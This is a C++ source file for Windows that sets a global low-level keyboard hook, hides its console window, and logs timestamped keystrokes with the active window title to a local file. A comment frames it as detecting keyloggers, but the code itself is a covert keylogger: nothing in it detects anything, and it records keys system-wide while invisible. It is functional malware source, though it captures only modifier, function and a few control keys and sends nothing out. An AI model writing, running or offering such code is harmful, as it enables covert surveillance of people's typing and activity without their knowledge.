#include <iostream>
#include <fstream>
#include <ctime>
#include <iomanip>
#include <windows.h>
#include <winuser.h>

HHOOK keyboardHook;
std::ofstream logFile;

const std::string LOG_FILE_PATH = "keylog.txt";

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;

        // Check for key events
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        {
            // Check for specific keys that may indicate keyloggers
            switch (kbdStruct->vkCode)
            {
            case VK_LCONTROL:
            case VK_RCONTROL:
            case VK_LSHIFT:
            case VK_RSHIFT:
            case VK_LMENU:
            case VK_RMENU:
            case VK_F1:
            case VK_F2:
            case VK_F3:
            case VK_F4:
            case VK_F5:
            case VK_F6:
            case VK_F7:
            case VK_F8:
            case VK_F9:
            case VK_F10:
            case VK_F11:
            case VK_F12:
            case VK_RETURN:
            case VK_ESCAPE:
            case VK_SPACE:
            case VK_BACK:
            case VK_TAB:
            case VK_CAPITAL:
            {
                HWND activeWindow = GetForegroundWindow();
                wchar_t windowTitle[256];
                GetWindowTextW(activeWindow, windowTitle, sizeof(windowTitle) / sizeof(wchar_t));

                std::time_t now = std::time(nullptr);
                std::tm *timeinfo = std::localtime(&now);
                char timestamp[20];
                std::strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", timeinfo);

                logFile << "[" << timestamp << "] Window: " << windowTitle
                        << " | Key pressed: 0x" << std::hex << std::setw(2) << std::setfill('0') << kbdStruct->vkCode << std::endl;
                logFile.flush();

                break;
            }
            default:
                break;
            }
        }
    }

    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

void InstallKeyboardHook()
{
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (keyboardHook == NULL)
    {
        std::cerr << "Failed to install keyboard hook!" << std::endl;
        exit(1);
    }
}

void UninstallKeyboardHook()
{
    if (UnhookWindowsHookEx(keyboardHook) == 0)
    {
        std::cerr << "Failed to uninstall keyboard hook!" << std::endl;
    }
}

void HideConsoleWindow()
{
    HWND consoleWindow = GetConsoleWindow();
    ShowWindow(consoleWindow, SW_HIDE);
}

int main()
{
    HideConsoleWindow();

    logFile.open(LOG_FILE_PATH, std::ios::app);
    if (!logFile)
    {
        std::cerr << "Failed to open log file for writing!" << std::endl;
        return 1;
    }

    InstallKeyboardHook();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UninstallKeyboardHook();

    logFile.close();

    return 0;
}
